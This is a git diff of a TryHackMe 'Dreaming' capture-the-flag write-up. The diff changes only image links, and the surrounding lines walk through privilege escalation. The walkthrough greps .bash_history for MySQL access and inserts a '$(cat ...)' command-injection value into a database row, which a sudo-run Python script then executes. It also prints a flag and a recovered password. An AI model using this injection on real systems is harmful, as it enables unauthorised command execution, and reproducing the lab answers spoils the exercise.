@@ -257,13 +257,13 @@ nope, that would have been to easy!
 
 let's go back to our lucien folder and see if there is anything there we can leverage
 
-![[Pasted image 20241219143220.png]]
+![lslucien](https://github.com/francescaboe/thm-writeup-dreaming/blob/main/Pasted%20image%2020241219143220.png)
 
 looks like we have accessed mysql before, and we have a readable `bash_history` file
 
 `grep mysql .bash_history`
 
-![[Pasted image 20241219143427.png]]
+![mysqlgrep](https://github.com/francescaboe/thm-writeup-dreaming/blob/main/Pasted%20image%2020241219143427.png)
 
 noooice, let's try to get into that `library` DB
 
@@ -273,13 +273,13 @@ and we are in! Let's add some useful stuff for ourselves
 
 `INSERT INTO dreams (dreamer, dream) VALUES ('test', '$(cat /home/death/death_flag.txt)');`
 
-![[Pasted image 20241219135523.png]]
+![insert](https://github.com/francescaboe/thm-writeup-dreaming/blob/main/Pasted%20image%2020241219135523.png)
 
 and now let's try again
 
 `sudo /usr/bin/python3 /home/death/getDreams.py`
 
-![[Pasted image 20241219135352.png]]
+![secondflag](https://github.com/francescaboe/thm-writeup-dreaming/blob/main/Pasted%20image%2020241219135352.png)
 
 _THM{1M_TH3R3_4_TH3M}_
 
@@ -293,7 +293,7 @@ and run again
 
 `sudo /usr/bin/python3 /home/death/getDreams.py`
 
-![[Pasted image 20241219143732.png]]
+![deathpw](https://github.com/francescaboe/thm-writeup-dreaming/blob/main/Pasted%20image%2020241219143732.png)
 
 and we got ourselves a password! `!mementoMORI666!`
 
